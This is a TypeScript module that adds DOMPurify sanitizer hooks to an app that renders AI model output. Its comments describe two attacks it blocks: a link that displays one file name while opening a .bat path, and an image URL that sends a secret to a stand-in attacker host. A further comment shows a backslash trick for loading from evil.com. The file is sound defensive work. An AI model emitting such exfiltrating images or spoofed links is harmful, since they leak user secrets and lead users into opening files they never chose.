import DOMPurify from 'dompurify'

// Rules every piece of rendered model or task text goes through. They are
// DOMPurify hooks, so they apply to every sanitize call in the app: chat bubbles, plan
// cards and task descriptions alike.
//
// A chat link could SHOW one file name and OPEN another. The model can write raw HTML,
// and `<a class="auto-path" data-path="C:\proj\x.bat">README.md</a>` survived sanitizing.
// Now a path link only counts when it carries this page's random marker, which the app's
// own markdown step adds (utils/markdown.ts) and model text cannot know. Its text always
// shows the real path. Every link that opens a new tab gets rel="noopener noreferrer".
//
// An <img src="//attacker/p?d=SECRET"> in model output loaded as soon as the message
// rendered, leaking whatever the URL carried. Images may only come from this app or be
// inline data. (The page's Content-Security-Policy says the same, as a second layer.)

/** Random per page load; the app's own path anchors carry it, model text cannot guess it. */
export const PATH_LINK_MARKER = typeof crypto !== 'undefined' && 'randomUUID' in crypto
  ? crypto.randomUUID()
  : Math.random().toString(36).slice(2) + Date.now().toString(36)

const SAFE_HREF = /^(https?:|mailto:|#)/i

function isAllowedImageSrc(src: string): boolean {
  const s = src.trim()
  if (/^data:image\//i.test(s) || /^blob:/i.test(s)) return true
  // Always resolved against the page: "/\evil.com/x.png" starts with "/" but a browser reads the
  // backslash as a slash and loads it from evil.com.
  try {
    // http(s) only: on a file:// page every origin is "null", so the comparison alone would pass
    // javascript: and //host.
    const u = new URL(s, window.location.href)
    return /^https?:$/.test(u.protocol) && u.origin === window.location.origin
  } catch {
    return false
  }
}

let installed = false
// Anchors that carried this page's marker when sanitizing began. Recorded before DOMPurify
// filters attributes, so the check does not depend on each caller's attribute allowlist.
const authenticPathLinks = new WeakSet<Node>()

export function installSanitizerHooks(): void {
  if (installed) return
  installed = true
  DOMPurify.addHook('uponSanitizeElement', (node) => {
    const el = node as Element
    if (el.tagName?.toLowerCase() === 'a' && el.getAttribute?.('data-orc-link') === PATH_LINK_MARKER) authenticPathLinks.add(node)
  })
  DOMPurify.addHook('afterSanitizeAttributes', (node) => {
    const el = node as Element
    if (!el.tagName) return
    const tag = el.tagName.toLowerCase()

    if (tag === 'a') {
      const isPathLink = el.classList.contains('auto-path') || el.hasAttribute('data-path')
      if (isPathLink) {
        const authentic = authenticPathLinks.has(node) && el.hasAttribute('data-path')
        el.removeAttribute('data-orc-link')
        if (!authentic) {
          el.classList.remove('auto-path')
          el.removeAttribute('data-path')
          el.removeAttribute('data-path-alt')
        } else {
          const real = el.getAttribute('data-path') ?? ''
          const shown = (el.textContent ?? '').trim()
          // The label a link shows is the file it opens. A markdown label keeps its words,
          // followed by the real path.
          if (shown !== real) el.textContent = shown ? `${shown} (${real})` : real
          el.setAttribute('title', real)
        }
      }
      const href = el.getAttribute('href')
      if (href !== null && !SAFE_HREF.test(href.trim())) el.setAttribute('href', '#')
      if (el.hasAttribute('target') || /^https?:/i.test(href ?? '')) {
        el.setAttribute('target', '_blank')
        el.setAttribute('rel', 'noopener noreferrer')
      }
      return
    }

    // data-path belongs to app-made anchors only.
    el.removeAttribute('data-path')
    el.removeAttribute('data-path-alt')
    el.removeAttribute('data-orc-link')

    if (tag === 'img') {
      const src = el.getAttribute('src')
      if (src !== null && !isAllowedImageSrc(src)) {
        el.removeAttribute('src')
        el.removeAttribute('srcset')
        el.setAttribute('alt', 'Remote image blocked')
        el.setAttribute('title', `Remote image not loaded: ${src.slice(0, 200)}`)
      }
      el.removeAttribute('srcset')
    }
  })
}

installSanitizerHooks()
